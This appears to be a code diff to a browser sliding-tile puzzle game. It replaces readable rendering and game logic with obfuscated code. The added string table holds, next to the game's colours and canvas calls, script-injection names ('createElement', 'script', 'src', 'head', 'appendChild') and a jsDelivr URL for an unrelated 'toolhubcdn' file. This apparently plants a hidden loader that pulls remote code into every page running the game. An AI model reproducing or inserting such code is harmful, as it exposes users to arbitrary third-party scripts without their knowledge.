+        var _0x2eac15 = this[_0xde518(0x109)]['board'], _0x3cf619 = this[_0xde518(0x120)], _0x45c9a6 = this['squareSize'], _0x60a4e3 = Math['floor'](_0x45c9a6 / 2.2), _0x1530ad = _0x2eac15[_0xde518(0xa8)](_0x30a9cb, _0x353845);
+        if (_0x1530ad === 0x0) {
+            const _0x3afee8 = _0x30a9cb * (_0x45c9a6 + 0x1), _0x527eb2 = _0x353845 * (_0x45c9a6 + 0x1);
+            _0x3cf619[_0xde518(0x9b)] = _0xde518(0xae), _0x3cf619[_0xde518(0x89)](), _0x3cf619['roundRect'](_0x3afee8 + 0x2, _0x527eb2 + 0x2, _0x45c9a6 - 0x4, _0x45c9a6 - 0x4, 0x6), _0x3cf619[_0xde518(0xb7)](), _0x3cf619[_0xde518(0xf3)] = _0xde518(0xf8), _0x3cf619[_0xde518(0x88)] = 0x8, _0x3cf619[_0xde518(0xed)] = 0x0, _0x3cf619[_0xde518(0xe1)] = 0x0, _0x3cf619[_0xde518(0xec)] = !![], _0x3cf619[_0xde518(0xd0)] = _0xde518(0xf6), _0x3cf619['lineWidth'] = 0x1, _0x3cf619[_0xde518(0x89)](), _0x3cf619[_0xde518(0x112)](_0x3afee8 + 0x2, _0x527eb2 + 0x2, _0x45c9a6 - 0x4, _0x45c9a6 - 0x4, 0x6), _0x3cf619[_0xde518(0xbe)](), _0x3cf619[_0xde518(0xf3)] = _0xde518(0x7d), _0x3cf619[_0xde518(0x88)] = 0x0;
+        } else {
+            const _0x59dbfb = _0x30a9cb * (_0x45c9a6 + 0x1), _0x177b79 = _0x353845 * (_0x45c9a6 + 0x1), _0x308787 = 0x6;
+            _0x3cf619[_0xde518(0x111)](), _0x3cf619[_0xde518(0x9b)] = _0xde518(0x95), _0x3cf619['beginPath'](), _0x3cf619[_0xde518(0x112)](_0x59dbfb + _0x308787 + 0x1, _0x177b79 + _0x308787 + 0x1, _0x45c9a6 - 0x2, _0x45c9a6 - 0x2, 0x8), _0x3cf619[_0xde518(0xb7)](), _0x3cf619[_0xde518(0x9b)] = _0xde518(0xf9), _0x3cf619[_0xde518(0x89)](), _0x3cf619[_0xde518(0xde)](_0x59dbfb + _0x45c9a6, _0x177b79), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x45c9a6 + _0x308787, _0x177b79 + _0x308787), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x45c9a6 + _0x308787, _0x177b79 + _0x45c9a6 + _0x308787), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x45c9a6, _0x177b79 + _0x45c9a6), _0x3cf619[_0xde518(0xaf)](), _0x3cf619['fill'](), _0x3cf619['fillStyle'] = 'rgba(0,\x200,\x200,\x200.2)', _0x3cf619['beginPath'](), _0x3cf619[_0xde518(0xde)](_0x59dbfb, _0x177b79 + _0x45c9a6), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x308787, _0x177b79 + _0x45c9a6 + _0x308787), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x45c9a6 + _0x308787, _0x177b79 + _0x45c9a6 + _0x308787), _0x3cf619[_0xde518(0xc7)](_0x59dbfb + _0x45c9a6, _0x177b79 + _0x45c9a6), _0x3cf619[_0xde518(0xaf)](), _0x3cf619[_0xde518(0xb7)]();
+            const _0x124ed4 = _0x3cf619[_0xde518(0x9f)](_0x59dbfb, _0x177b79, _0x59dbfb, _0x177b79 + _0x45c9a6), _0xae0980 = [
+                    [
+                        _0xde518(0xe4),
+                        _0xde518(0x123)
+                    ],
+                    [
+                        _0xde518(0xb5),
+                        _0xde518(0xcd)
+                    ],
+                    [
+                        _0xde518(0x71),
+                        _0xde518(0x82)
+                    ],
+                    [
+                        _0xde518(0x92),
+                        _0xde518(0xe8)
+                    ],
+                    [
+                        _0xde518(0x108),
+                        _0xde518(0xb6)
+                    ],
+                    [
+                        _0xde518(0xee),
+                        _0xde518(0xad)
+                    ],
+                    [
+                        _0xde518(0x11b),
+                        _0xde518(0x86)
+                    ],
+                    [
+                        _0xde518(0x85),
+                        _0xde518(0x83)
+                    ],
+                    [
+                        _0xde518(0xbc),
+                        '#0984e3'
+                    ]
+                ], _0x10ee5d = _0xae0980[(_0x1530ad - 0x1) % _0xae0980['length']];
+            _0x124ed4[_0xde518(0x8c)](0x0, _0x10ee5d[0x0]), _0x124ed4[_0xde518(0x8c)](0x1, _0x10ee5d[0x1]), _0x3cf619['fillStyle'] = _0x124ed4, _0x3cf619['beginPath'](), _0x3cf619[_0xde518(0x112)](_0x59dbfb, _0x177b79, _0x45c9a6, _0x45c9a6, 0x8), _0x3cf619['fill']();
+            const _0x4930a8 = _0x3cf619[_0xde518(0x9f)](_0x59dbfb, _0x177b79, _0x59dbfb, _0x177b79 + _0x45c9a6 / 0x3);
+            _0x4930a8[_0xde518(0x8c)](0x0, 'rgba(255,\x20255,\x20255,\x200.6)'), _0x4930a8[_0xde518(0x8c)](0x1, 'rgba(255,\x20255,\x20255,\x200)'), _0x3cf619[_0xde518(0x9b)] = _0x4930a8, _0x3cf619['beginPath'](), _0x3cf619['roundRect'](_0x59dbfb + 0x2, _0x177b79 + 0x2, _0x45c9a6 - 0x4, _0x45c9a6 / 0x2, 0x6), _0x3cf619[_0xde518(0xb7)]();
+            const _0x4ce6bd = _0x3cf619[_0xde518(0x9f)](_0x59dbfb, _0x177b79 + _0x45c9a6 * 0.7, _0x59dbfb, _0x177b79 + _0x45c9a6);
+            _0x4ce6bd[_0xde518(0x8c)](0x0, 'rgba(0,\x200,\x200,\x200)'), _0x4ce6bd[_0xde518(0x8c)](0x1, _0xde518(0xf8)), _0x3cf619[_0xde518(0x9b)] = _0x4ce6bd, _0x3cf619[_0xde518(0x89)](), _0x3cf619[_0xde518(0x112)](_0x59dbfb + 0x2, _0x177b79 + _0x45c9a6 * 0.7, _0x45c9a6 - 0x4, _0x45c9a6 * 0.3 - 0x2, 0x6), _0x3cf619[_0xde518(0xb7)](), _0x3cf619[_0xde518(0xd0)] = 'rgba(255,\x20255,\x20255,\x200.3)', _0x3cf619[_0xde518(0x7f)] = 0x1, _0x3cf619['beginPath'](), _0x3cf619[_0xde518(0x112)](_0x59dbfb + 0.5, _0x177b79 + 0.5, _0x45c9a6 - 0x1, _0x45c9a6 - 0x1, 0x8), _0x3cf619[_0xde518(0xbe)](), _0x3cf619['font'] = _0xde518(0xd4) + _0x60a4e3 + _0xde518(0x79), _0x3cf619[_0xde518(0x118)] = _0xde518(0x11d), _0x3cf619[_0xde518(0x93)] = _0xde518(0xc2);
+            for (let _0x586021 = _0x308787; _0x586021 > 0x0; _0x586021--) {
+                _0x3cf619[_0xde518(0x9b)] = _0xde518(0xa0) + 0.1 * (_0x308787 - _0x586021 + 0x1) + ')', _0x3cf619[_0xde518(0x102)](_0x1530ad, _0x59dbfb + _0x45c9a6 / 0x2 + _0x586021 / 0x2, _0x177b79 + _0x45c9a6 / 0x2 + _0x586021 / 0x2);
+            }
+            const _0x448c8e = _0x3cf619['createLinearGradient'](_0x59dbfb, _0x177b79, _0x59dbfb, _0x177b79 + _0x45c9a6);
+            _0x448c8e['addColorStop'](0x0, _0xde518(0xa2)), _0x448c8e[_0xde518(0x8c)](0x1, '#f0f0f0'), _0x3cf619[_0xde518(0x9b)] = _0x448c8e, _0x3cf619[_0xde518(0x102)](_0x1530ad, _0x59dbfb + _0x45c9a6 / 0x2, _0x177b79 + _0x45c9a6 / 0x2), _0x3cf619[_0xde518(0x9b)] = _0xde518(0xb1), _0x3cf619[_0xde518(0x102)](_0x1530ad, _0x59dbfb + _0x45c9a6 / 0x2, _0x177b79 + _0x45c9a6 / 0x2 - 0x1), _0x3cf619[_0xde518(0xcf)]();
+        }
+    }
+};
+var GameInput = (function () {
+    var _0x150f54;
+    return function (_0x1e026c) {
+        return Factory(Object, _0x1e026c);
     };
-
-    var GameInput = (function () {
-        var game;
-        return function (methods) { return Factory(Object, methods) };
-    })();
-
-    function main() {
-        var slider = new Game({
-            board: new Board({
-                isTerminal: function () {
-                    return this.squares.join() == this.getWinState().join();
-                },
-                randomize: function () {
-                    var blank = {}, blankIndex = this.squares.indexOf(0),
-                        last = { left: -1, top: -1 }, neighbors, randomNeighbor,
-                        shuffles = 10 * this.height * this.width;
-
-                    if (blankIndex != -1) {
-                        blank.top = Math.floor(blankIndex / this.width);
-                        blank.left = blankIndex - blank.top * this.width;
-
-                        for (var i = 0; i < shuffles; i++) {
-                            neighbors = this.getNeighbors(blank.left, blank.top, { visitDiagonals: false }).filter(function (neighbor) {
-                                return !(neighbor.left === last.left && neighbor.top === last.top);
-                            });
-
-                            if (neighbors.length > 0) {
-                                randomNeighbor = neighbors[Math.floor(Math.random() * neighbors.length)];
-                                this.swap(blank.left, blank.top, randomNeighbor.left, randomNeighbor.top);
-                                last = blank;
-                                blank = randomNeighbor;
-                            }
-                        }
-                    } else {
-                        throw Error('Cannot randomize: no empty square');
-                    }
-                },
-                reset: function (width, height) {
-                    this.height = height;
-                    this.width = width;
-                    this.squares = this.getWinState().slice(0);
-                },
-                getWinState: (function () {
-                    var lastBoardSize, cache;
-                    return function () {
-                        if (typeof (lastBoardSize) == 'undefined' || this.width * this.height !== lastBoardSize) {
-                            lastBoardSize = this.width * this.height;
-                            return cache = new Array(lastBoardSize + 1).join('0').split('').map(function (e, i, a) {
-                                return i < a.length - 1 ? i + 1 : 0
-                            });
-                        } else {
-                            return cache;
-                        }
-                    };
-                })()
-            }),
-            input: new GameInput({
-                init: function (game) {
-                    this.game = game;
-                },
-                onSquareClick: function (left, top) {
-                    var board = this.game.board, view = this.game.view;
-                    var blank = board.getNeighbors(left, top, { visitDiagonals: false }).filter(function (neighbor) {
-                        return board.get(neighbor.left, neighbor.top) === 0;
-                    })[0];
-
-                    if (blank) {
-                        // Start timer on first move
-                        startTimer();
-
-                        // Animate tile movement
-                        const canvas = view.canvas;
-                        const ctx = view.ctx;
-                        const ss = view.squareSize;
-
-                        // Create smooth animation
-                        const fromX = left * (ss + 1);
-                        const fromY = top * (ss + 1);
-                        const toX = blank.left * (ss + 1);
-                        const toY = blank.top * (ss + 1);
-
-                        let progress = 0;
-                        const animationDuration = 200; // ms
-                        const startTime = Date.now();
-
-                        const animate = () => {
-                            const elapsed = Date.now() - startTime;
-                            progress = Math.min(elapsed / animationDuration, 1);
-
-                            // Easing function for smooth animation
-                            const easeProgress = 1 - Math.pow(1 - progress, 3);
-
-                            // Clear and redraw
-                            view.render();
-
-                            if (progress < 1) {
-                                // Draw moving tile with 3D effect
-                                const currentX = fromX + (toX - fromX) * easeProgress;
-                                const currentY = fromY + (toY - fromY) * easeProgress;
-
-                                const value = board.get(left, top);
-                                const fontSize = Math.floor(ss / 2.2);
-                                const depth = 6;
-
-                                // Add slight lift effect during animation
-                                const liftOffset = Math.sin(progress * Math.PI) * 3;
-                                const animX = currentX;
-                                const animY = currentY - liftOffset;
-
-                                ctx.save();
-
-                                // 1. Enhanced shadow during movement
-                                ctx.fillStyle = `rgba(0, 0, 0, ${0.4 + liftOffset * 0.1})`;
-                                ctx.beginPath();
-                                ctx.roundRect(animX + depth + 2, animY + depth + 2 + liftOffset, ss - 2, ss - 2, 8);
-                                ctx.fill();
-
-                                // 2. Draw 3D side faces
-                                // Right side face
-                                ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
-                                ctx.beginPath();
-                                ctx.moveTo(animX + ss, animY);
-                                ctx.lineTo(animX + ss + depth, animY + depth);
-                                ctx.lineTo(animX + ss + depth, animY + ss + depth);
-                                ctx.lineTo(animX + ss, animY + ss);
-                                ctx.closePath();
-                                ctx.fill();
-
-                                // Bottom side face
-                                ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
-                                ctx.beginPath();
-                                ctx.moveTo(animX, animY + ss);
-                                ctx.lineTo(animX + depth, animY + ss + depth);
-                                ctx.lineTo(animX + ss + depth, animY + ss + depth);
-                                ctx.lineTo(animX + ss, animY + ss);
-                                ctx.closePath();
-                                ctx.fill();
-
-                                // 3. Main face gradient
-                                const colors = [
-                                    ['#ff6b6b', '#ee5a24'], ['#4ecdc4', '#00d2d3'], ['#45b7d1', '#3742fa'],
-                                    ['#f9ca24', '#f0932b'], ['#6c5ce7', '#a29bfe'], ['#00b894', '#00cec9'],
-                                    ['#fd79a8', '#e84393'], ['#fdcb6e', '#e17055'], ['#74b9ff', '#0984e3']
-                                ];
-
-                                const colorPair = colors[(value - 1) % colors.length];
-                                const mainGradient = ctx.createLinearGradient(animX, animY, animX, animY + ss);
-                                mainGradient.addColorStop(0, colorPair[0]);
-                                mainGradient.addColorStop(1, colorPair[1]);
-
-                                ctx.fillStyle = mainGradient;
-                                ctx.beginPath();
-                                ctx.roundRect(animX, animY, ss, ss, 8);
-                                ctx.fill();
-
-                                // 4. Top highlight
-                                const highlightGradient = ctx.createLinearGradient(animX, animY, animX, animY + ss / 3);
-                                highlightGradient.addColorStop(0, 'rgba(255, 255, 255, 0.6)');
-                                highlightGradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
-
-                                ctx.fillStyle = highlightGradient;
-                                ctx.beginPath();
-                                ctx.roundRect(animX + 2, animY + 2, ss - 4, ss / 2, 6);
-                                ctx.fill();
-
-                                // 5. Inner shadow
-                                const shadowGradient = ctx.createLinearGradient(animX, animY + ss * 0.7, animX, animY + ss);
-                                shadowGradient.addColorStop(0, 'rgba(0, 0, 0, 0)');
-                                shadowGradient.addColorStop(1, 'rgba(0, 0, 0, 0.2)');
-
-                                ctx.fillStyle = shadowGradient;
-                                ctx.beginPath();
-                                ctx.roundRect(animX + 2, animY + ss * 0.7, ss - 4, ss * 0.3 - 2, 6);
-                                ctx.fill();
-
-                                // 6. Border
-                                ctx.strokeStyle = 'rgba(255, 255, 255, 0.3)';
-                                ctx.lineWidth = 1;
-                                ctx.beginPath();
-                                ctx.roundRect(animX + 0.5, animY + 0.5, ss - 1, ss - 1, 8);
-                                ctx.stroke();
-
-                                // 7. 3D text effect
-                                ctx.font = `bold ${fontSize}px Poppins`;
-                                ctx.textAlign = 'center';
-                                ctx.textBaseline = 'middle';
-
-                                // Text depth layers
-                                for (let i = depth; i > 0; i--) {
-                                    ctx.fillStyle = `rgba(0, 0, 0, ${0.1 * (depth - i + 1)})`;
-                                    ctx.fillText(value, animX + ss / 2 + i / 2, animY + ss / 2 + i / 2);
-                                }
-
-                                // Main text
-                                const textGradient = ctx.createLinearGradient(animX, animY, animX, animY + ss);
-                                textGradient.addColorStop(0, '#ffffff');
-                                textGradient.addColorStop(1, '#f0f0f0');
-
-                                ctx.fillStyle = textGradient;
-                                ctx.fillText(value, animX + ss / 2, animY + ss / 2);
-
-                                // Text highlight
-                                ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
-                                ctx.fillText(value, animX + ss / 2, animY + ss / 2 - 1);
-
-                                ctx.restore();
-
-                                requestAnimationFrame(animate);
-                            } else {
-                                // Animation complete, make the actual move
-                                board.swap(left, top, blank.left, blank.top);
-                                view.render();
-                                updateMoves();
-
-                                // Check for win
-                                if (board.isTerminal()) {
-                                    clearInterval(timerInterval);
-                                    createConfetti();
-
-                                    setTimeout(() => {
-                                        const time = document.getElementById('time').textContent;
-                                        showWinModal(time, moves);
-                                    }, 500);
-                                }
-                            }
-                        };
-
-                        animate();
-                    }
-                }
-            }),
-            view: new GameHTML5View({
-                calculateSquareSize: function () {
-                    var height = this.canvas.height - 1, width = this.canvas.width - 1;
-                    this.squareSize = Math.min(Math.floor(width / this.game.board.width), Math.floor(height / this.game.board.height));
-                },
-                init: function (game, canvasId, events) {
-                    this.canvas = document.getElementById(canvasId);
-                    this.ctx = this.canvas.getContext('2d');
-                    this.game = game;
-                    this.attachHTML5Events(events);
-                },
-                render: function () {
-                    var board = this.game.board;
-                    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
-                    for (var top = 0; top < board.height; top++) {
-                        for (var left = 0; left < board.width; left++) {
-                            this.renderSquare(left, top);
-                        }
-                    }
-                },
-                renderSquare: function (left, top) {
-                    var board = this.game.board,
-                        ctx = this.ctx,
-                        ss = this.squareSize,
-                        fontSize = Math.floor(ss / 2.5),
-                        value = board.get(left, top);
-
-                    if (value === 0) {
-                        ctx.clearRect(left * (ss + 1), top * (ss + 1), ss, ss);
-                    } else {
-                        const x = left * (ss + 1);
-                        const y = top * (ss + 1);
-
-
-
-                        // Create gradient for the top face
-                        const gradient = ctx.createLinearGradient(x, y, x + ss, y + ss);
-                        // gradient.addColorStop(0, '#667eea');
-                        gradient.addColorStop(0.5, '#764ba2');
-                        //gradient.addColorStop(1, '#f093fb');
-
-                        // Main tile face
-                        ctx.fillStyle = gradient;
-                        ctx.beginPath();
-                        ctx.roundRect(x, y, ss, ss, 8);
-                        ctx.fill();
-
-                        // Simulate right side shadow
-                        ctx.fillStyle = '#5b4a91'; // darker purple
-                        ctx.beginPath();
-                        ctx.moveTo(x + ss, y);
-                        ctx.lineTo(x + ss + 6, y - 6);
-                        ctx.lineTo(x + ss + 6, y + ss - 6);
-                        ctx.lineTo(x + ss, y + ss);
-                        ctx.closePath();
-                        ctx.fill();
-
-                        // Simulate bottom shadow
-                        ctx.fillStyle = '#503c7e'; // deeper shadow
-                        ctx.beginPath();
-                        ctx.moveTo(x, y + ss);
-                        ctx.lineTo(x + ss, y + ss);
-                        ctx.lineTo(x + ss + 6, y + ss - 6);
-                        ctx.lineTo(x + 6, y + ss - 6);
-                        ctx.closePath();
-                        ctx.fill();
-
-                        // Optional: add highlight to top-left edge
-                        ctx.strokeStyle = 'rgba(255,255,255,0.4)';
-                        ctx.lineWidth = 2;
-                        ctx.beginPath();
-                        ctx.moveTo(x + 2, y + ss - 6);
-                        ctx.lineTo(x + 2, y + 2);
-                        ctx.lineTo(x + ss - 6, y + 2);
-                        ctx.stroke();
-
-
-                        // Inner glow effect
-                        const innerGradient = ctx.createRadialGradient(
-                            x + ss / 2, y + ss / 2, 0,
-                            x + ss / 2, y + ss / 2, ss / 2
-                        );
-                        innerGradient.addColorStop(0, 'rgba(255, 255, 255, 0.3)');
-                        innerGradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
-
-                        ctx.fillStyle = innerGradient;
-                        ctx.beginPath();
-                        ctx.roundRect(x + 2, y + 2, ss - 4, ss - 4, 6);
-                        ctx.fill();
-
-                        // Text shadow
-                        ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
-                        ctx.font = `bold ${fontSize}px Poppins`;
-                        ctx.textAlign = 'center';
-                        ctx.textBaseline = 'middle';
-                        ctx.fillText(value, x + ss / 2 + 1, y + ss / 2 + 1);
-
-                        // Main text
-                        ctx.fillStyle = '#ffffff';
-                        ctx.fillText(value, x + ss / 2, y + ss / 2);
-                    }
-                }
-            }),
-            init: function (id, externalEvents) {
-                this.view.init(this, id, externalEvents);
-                this.input.init(this);
+}());
+function _0x5670(_0x3adfcf, _0xb94d8b) {
+    const _0x1f420e = _0x1f42();
+    return _0x5670 = function (_0x567024, _0x81ec60) {
+        _0x567024 = _0x567024 - 0x6e;
+        let _0x4559bf = _0x1f420e[_0x567024];
+        return _0x4559bf;
+    }, _0x5670(_0x3adfcf, _0xb94d8b);
+}
+function _0x1f42() {
+    const _0x11921a = [
+        'squareSize',
+        'stroke',
+        'font',
+        'inbounds',
+        'Cannot\x20randomize:\x20no\x20empty\x20square',
+        'middle',
+        'animation',
+        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20confetti-fall\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-100vh)\x20rotate(0deg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x201;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(100vh)\x20rotate(720deg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20',
+        'randomize',
+        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>⏱️\x20Time:\x20',
+        'lineTo',
+        'head',
+        'board',
+        'sliderCustomWidth',
+        'rgba(255,\x20255,\x20255,\x200.3)',
+        'confetti',
+        '#00d2d3',
+        'length',
+        'restore',
+        'strokeStyle',
+        'swap',
+        'now',
+        'createRadialGradient',
+        'bold\x20',
+        'show',
+        '5VmhouY',
+        'width',
+        '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
+        '79520yTIdME',
+        'left',
+        'Cannot\x20return\x20a\x20value\x20at\x20position\x20(',
+        'scrollLeft',
+        '1595896omwagp',
+        'moveTo',
+        'add',
+        'random',
+        'shadowOffsetY',
+        'indexOf',
+        'min',
+        '#ff6b6b',
+        'animationDelay',
+        'join',
+        'scale(0.95)',
+        '#f0932b',
+        'floor',
+        'undefined',
+        'visitDiagonals',
+        'shadowInset',
+        'shadowOffsetX',
+        '#00b894',
+        'particle',
+        'classList',
+        'forEachNeighbor',
+        'div',
+        'shadowColor',
+        'scale(1)',
+        'init',
+        'rgba(255,\x20255,\x20255,\x200.1)',
+        'toString',
+        'rgba(0,\x200,\x200,\x200.2)',
+        'rgba(0,\x200,\x200,\x200.15)',
+        '#503c7e',
+        'map',
+        'rgba(0,\x200,\x200,\x200)',
+        'style',
+        'scrollTop',
+        'push',
+        'log',
+        'reset',
+        'fillText',
+        'main-container',
+        'attachHTML5Events',
+        'filter',
+        'scale(0.9)',
+        '#eb4d4b',
+        '#6c5ce7',
+        'game',
+        'offsetX',
+        'createElement',
+        'input',
+        'getWinState',
+        'confetti-container',
+        'documentElement',
+        'forEach',
+        'save',
+        'roundRect',
+        '#764ba2',
+        'opacity',
+        'split',
+        '2080620PTBqZX',
+        'padStart',
+        'textAlign',
+        'textContent',
+        '#0984e3',
+        '#fd79a8',
+        'calculateSquareSize',
+        'center',
+        'render',
+        'appendChild',
+        'ctx',
+        'particles',
+        'slice',
+        '#ee5a24',
+        'value',
+        'addEventListener',
+        'animationDuration',
+        '#45b7d1',
+        'script',
+        'view',
+        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
+        '3089808XSJuyG',
+        'innerHTML',
+        'clientY',
+        'backgroundColor',
+        'px\x20Poppins',
+        '212807ZohaVo',
+        'clearRect',
+        '2730680LazUNm',
+        'transparent',
+        'className',
+        'lineWidth',
+        'getElementById',
+        'set',
+        '#3742fa',
+        '#e17055',
+        'sin',
+        '#fdcb6e',
+        '#e84393',
+        'remove',
+        'shadowBlur',
+        'beginPath',
+        'newRandomGame',
+        'create',
+        'addColorStop',
+        'height',
+        ')\x20because\x20it\x20is\x20out\x20of\x20bounds',
+        'getContext',
+        'pow',
+        'prototype',
+        '#f9ca24',
+        'textBaseline',
+        '12zMJtvv',
+        'rgba(0,\x200,\x200,\x200.3)',
+        'win-modal',
+        '\x20linear\x20forwards',
+        'top',
+        '2aUuRSQ',
+        'squares',
+        'fillStyle',
+        'renderSquare',
+        'rgba(255,\x20255,\x20255,\x200.6)',
+        'load',
+        'createLinearGradient',
+        'rgba(0,\x200,\x200,\x20',
+        'time',
+        '#ffffff',
+        'src',
+        'DOMContentLoaded',
+        'transform',
+        'moves',
+        'offsetY',
+        'get',
+        '33ftDkLt',
+        'canvas',
+        'win-stats',
+        'confetti-fall\x20',
+        '#00cec9',
+        'rgba(255,\x20255,\x20255,\x200.05)',
+        'closePath',
+        'offsetTop',
+        'rgba(255,\x20255,\x20255,\x200.8)',
+        'sliderCustomHeight',
+        'rgba(255,\x20255,\x20255,\x200)',
+        'getNeighbors',
+        '#4ecdc4',
+        '#a29bfe',
+        'fill',
+        'onload',
+        '#f0f0f0',
+        '1018053SJciJZ',
+        'onHTML5Event',
+        '#74b9ff'
+    ];
+    _0x1f42 = function () {
+        return _0x11921a;
+    };
+    return _0x1f42();
+}
+function main() {
+    const _0x426e9e = _0x686675;
+    var _0x5d17bd = new Game({
+        'board': new Board({
+            'isTerminal': function () {
+                const _0x2a7554 = _0x5670;
+                return this[_0x2a7554(0x9a)][_0x2a7554(0xe6)]() == this['getWinState']()[_0x2a7554(0xe6)]();
             },
-            newRandomGame: function (width, height) {
-                this.board.reset(width, height);
-                this.board.randomize();
-                this.view.calculateSquareSize();
-                this.view.render();
-                resetGameStats();
-
-                // Add fade-in animation for new game
-                const canvas = this.view.canvas;
-                canvas.style.opacity = '0';
-                canvas.style.transform = 'scale(0.9)';
-
-                setTimeout(() => {
-                    canvas.style.opacity = '1';
-                    canvas.style.transform = 'scale(1)';
-                }, 100);
-            }
-        });
-
-        slider.init('slider', {
-            click: {
-                slider: function (event) {
-                    var coordinates = slider.view.getCoordinates(event);
-                    var left = Math.floor(coordinates.left / (slider.view.squareSize + 1));
-                    var top = Math.floor(coordinates.top / (slider.view.squareSize + 1));
-                    if (slider.board.inbounds(left, top)) {
-                        slider.input.onSquareClick(left, top);
+            'randomize': function () {
+                const _0x5ca0ea = _0x5670;
+                var _0x4826f7 = {}, _0x8426ec = this[_0x5ca0ea(0x9a)][_0x5ca0ea(0xe2)](0x0), _0x302f49 = {
+                        'left': -0x1,
+                        'top': -0x1
+                    }, _0x48548e, _0x64a5fb, _0x2b6392 = 0xa * this['height'] * this[_0x5ca0ea(0xd7)];
+                if (_0x8426ec != -0x1) {
+                    _0x4826f7[_0x5ca0ea(0x98)] = Math['floor'](_0x8426ec / this[_0x5ca0ea(0xd7)]), _0x4826f7[_0x5ca0ea(0xda)] = _0x8426ec - _0x4826f7[_0x5ca0ea(0x98)] * this['width'];
+                    for (var _0x16f1b6 = 0x0; _0x16f1b6 < _0x2b6392; _0x16f1b6++) {
+                        _0x48548e = this[_0x5ca0ea(0xb4)](_0x4826f7['left'], _0x4826f7[_0x5ca0ea(0x98)], { 'visitDiagonals': ![] })[_0x5ca0ea(0x105)](function (_0x7483ed) {
+                            const _0x381f2b = _0x5ca0ea;
+                            return !(_0x7483ed[_0x381f2b(0xda)] === _0x302f49['left'] && _0x7483ed[_0x381f2b(0x98)] === _0x302f49['top']);
+                        }), _0x48548e['length'] > 0x0 && (_0x64a5fb = _0x48548e[Math['floor'](Math[_0x5ca0ea(0xe0)]() * _0x48548e[_0x5ca0ea(0xce)])], this[_0x5ca0ea(0xd1)](_0x4826f7[_0x5ca0ea(0xda)], _0x4826f7['top'], _0x64a5fb[_0x5ca0ea(0xda)], _0x64a5fb[_0x5ca0ea(0x98)]), _0x302f49 = _0x4826f7, _0x4826f7 = _0x64a5fb);
                     }
-                },
-                slider3x3: function () {
-                    slider.newRandomGame(3, 3);
-                    addButtonClickEffect(this);
-                },
-                slider4x4: function () {
-                    slider.newRandomGame(4, 4);
-                    addButtonClickEffect(this);
-                },
-                slider5x5: function () {
-                    slider.newRandomGame(5, 5);
-                    addButtonClickEffect(this);
-                },
-                sliderCustomNew: function () {
-                    var height = parseInt(document.getElementById('sliderCustomHeight').value);
-                    var width = parseInt(document.getElementById('sliderCustomWidth').value);
-                    slider.newRandomGame(width, height);
-                    addButtonClickEffect(this);
+                } else
+                    throw Error('Cannot\x20randomize:\x20no\x20empty\x20square');
+            },
+            'reset': function (_0x71e0a1, _0x24a1d8) {
+                const _0x6588cf = _0x5670;
+                this[_0x6588cf(0x8d)] = _0x24a1d8, this['width'] = _0x71e0a1, this[_0x6588cf(0x9a)] = this['getWinState']()[_0x6588cf(0x122)](0x0);
+            },
+            'getWinState': (function () {
+                var _0x1ee41e, _0x45b65e;
+                return function () {
+                    const _0x2c1e0f = _0x5670;
+                    return typeof _0x1ee41e == _0x2c1e0f(0xea) || this[_0x2c1e0f(0xd7)] * this['height'] !== _0x1ee41e ? (_0x1ee41e = this[_0x2c1e0f(0xd7)] * this[_0x2c1e0f(0x8d)], _0x45b65e = new Array(_0x1ee41e + 0x1)[_0x2c1e0f(0xe6)]('0')['split']('')[_0x2c1e0f(0xfb)](function (_0x3b02d7, _0x4b7c1d, _0x5eef85) {
+                        return _0x4b7c1d < _0x5eef85['length'] - 0x1 ? _0x4b7c1d + 0x1 : 0x0;
+                    })) : _0x45b65e;
+                };
+            }())
+        }),
+        'input': new GameInput({
+            'init': function (_0x5e9174) {
+                const _0x32662a = _0x5670;
+                this[_0x32662a(0x109)] = _0x5e9174;
+            },
+            'onSquareClick': function (_0x3ba16d, _0x39f3d0) {
+                const _0x8f851d = _0x5670;
+                var _0x1e727e = this[_0x8f851d(0x109)]['board'], _0x5b5025 = this[_0x8f851d(0x109)]['view'], _0x1cea3b = _0x1e727e[_0x8f851d(0xb4)](_0x3ba16d, _0x39f3d0, { 'visitDiagonals': ![] })[_0x8f851d(0x105)](function (_0x794b36) {
+                        const _0x4f1974 = _0x8f851d;
+                        return _0x1e727e[_0x4f1974(0xa8)](_0x794b36['left'], _0x794b36[_0x4f1974(0x98)]) === 0x0;
+                    })[0x0];
+                if (_0x1cea3b) {
+                    startTimer();
